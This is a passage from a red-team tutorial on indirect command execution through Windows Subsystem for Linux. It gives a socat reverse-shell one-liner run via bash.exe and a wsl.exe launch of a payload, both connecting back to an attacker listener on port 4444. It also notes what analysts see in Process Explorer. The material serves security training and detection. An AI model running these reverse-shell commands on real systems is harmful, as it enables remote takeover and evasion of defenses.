<pre class="EnlighterJSRAW" data-enlighter-language="generic">Method 10 - WSL Only (bash.exe)</pre>
<p><span style="color: #000000;">The next two methods are use-case specific. WSL stands for Windows Subsystem for Linux and can help a user install an instance of their favourite Linux distro onto Windows itself by creating a subsystem. Here, the victim has installed an Ubuntu instance in WSL. It can be installed by instructions provided <a style="color: #000000;" href="https://ubuntu.com/tutorials/install-ubuntu-on-wsl2-on-windows-10#2-install-wsl">here</a>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjX4UB9zDDk1rAg-5vg7tIHyMLKVs8zdoyKIqNy8vKy8G42l74aSJllzAxjHQnAEQE4GJ3zCVIN8MiMbwjySV4MvkzF_rjs-zveqd_RYsiCJxxCIRn5I0_yjhVeQzNEqWwgIQHILI7rsbuI4p6LaLy50FgzcYaBnZgbVSHIIa5O2x3_Sr_tUOxgeHI9_g=s16000"/></span></p>
<p><span style="color: #000000;">If the victim installs WSL with the socat package, they can use bash.exe present in the system to obtain a reverse shell like so:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bash.exe -c "socat tcp-connect:192.168.0.89:4444 exec:sh,pty,stderr,setsid,sigint,sane"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjlMqohYTCrWXdeE1EMDrJ1_TWQue_NK4InmPw6KRGLtY3_b-AaWZBkvtuM6wym4XFN_jE9HwdVYw79JNFW1Ss-9Su37do4nyhF6rNLhSdtDV_4T6o-qu3uZ_tc9-KdFHQsLdzVbUsbgrj-wKzz9q23GD3zK7_paGAHXWyGHvkGeJ0olVrwci-W4Mt0iA=s16000"/></span></p>
<p><span style="color: #000000;">On our reverse listener set up on port 4444, we receive a connection as the shell executes!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjpXVCPNDTKhso1d2GAWMlDx_Qo6Yi2WY6dU2CNv_6JyaHLs_B5HJMS18fNYxb6Oi_nWPVWW3shkI48YPuq1e8Suof-9vvxeyDu_aMBwSbmYeK39jN28GLqkBpUFfQdJ9Biqx-0s7QpI7ErRuKX20wBX_sV5mjGT_JmB8_q-sojIXHRu-uAxvtwpE3QRg=s16000"/></span></p>
<h5><span style="color: #000000;"><strong>Inspection in process explorer: </strong></span></h5>
<p><span style="color: #000000;">On the victim system, an analyst may check Process Explorer. </span><span style="color: #000000;">They will notice some suspicious processes running. </span><span style="color: #000000;">Specifically, the wsl.exe process has been launched. </span><span style="color: #000000;">Under it, conhost.exe is initiated. </span><span style="color: #000000;">Alongside it,socat and bash processes are also running. </span><span style="color: #000000;">This behavior is stealthy and unusual.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEittt9rmUo3xjNP73neVdVtzBTD25VwdOq4t1tR-_2WDNteK_x1lW0iiXGsJhuGo91S1EMsUSZA3C5PjqcpRX0l2LSC-5gpybV4C77JgokfV74rmaigrsi_k-HfnVlSJl4rGjLj31r2mZrsi7z-siH2ulQonRSAD4njrovkpWzL_S4u-sXG8vs9228xEw=s16000"/></span></p>
<h3><span style="color: #800000;">Method 11 – WSL Only (wsl.exe)</span></h3>
<p><span style="color: #000000;">Socat instance on a WSL is plausible but not necessary. However, by default, the Windows system includes an executable called wsl.exe where it installs WSL. You can use this exe to launch the exe present in WSL. This way, the shell will launch indirectly.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wsl.exe -e /mnt/c/Users/Public/shell.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjx-BRKTlxOyVryZf57AMZchGXcj8MIPICRgIjiT0Wrob-TVJHe2wqbMuHI4v4LvsQ6OVKHP50p7vkBKzjFJAgDCG-RTL4XsQgYLUnAt0OrR8rF6OfqZ61F1zmmgc9oCxWXcRZDpQLlRHzZOyl5uJv5qdNtGYyAkemBjiO8F79cqPLoCsQRSCGEWjOkjw=s16000"/></span></p>
<p><span style="color: #000000;">We receive a connection on our reverse listener set up on port 4444 as the shell executes!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg4EEg01VCw-3AGHwtyo0vjmU0xxZ240u-VZLHHOGFF3TGqzXsQz9xN_e93QKzPf2AsFOUNj9JhlicfTdlt0ns33r9Hq4MxQ1_s_v2ovNgdJj5xusvc_hn8Q3To-IUQ3AEJuewSKzGxDxOSjWPcN3mk_tDOqS2Np0jlTPaUZIKZ2C0AgIFZT-yYBSlumg=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Inspection in process explorer: </strong>In the victim system, if an analyst checks process explorer, he shall see the following processes running that should make him suspicious. As you can see, the system has launched the wsl.exe process, which initiates conhost along with a shell.exe process. It is not as stealthy as other methods.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiQ9zeo7Lkaklvr1zFEz3oV258i8d72wwQm50dhTjQnXZPO8KUfZljobgM896sKQrdHVXVkDLTSo-acnHMHASUE4dyoB6F9rAt_XSkJI7YudulLl0xct8ouKicvOWiHZudk1Z-HtUXnAo1vM8y97lbevGRTuBxD8RZOTb750PzjwXuJ9PAkzu6pOSe4Tw=s16000"/></span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">While some of the methods defined above are stealthy, others create some noise. Red Teamers must evaluate which method they want to use in order for them to conduct operations smoothly. The aim of the article was to demonstrate as many methods as possible for <strong data-start="454" data-end="484">Indirect Command Execution</strong> in order for a user to evade defenses easily. Hope you liked the article. Thanks for reading.</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong><span style="color: #000000;"> </span><a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
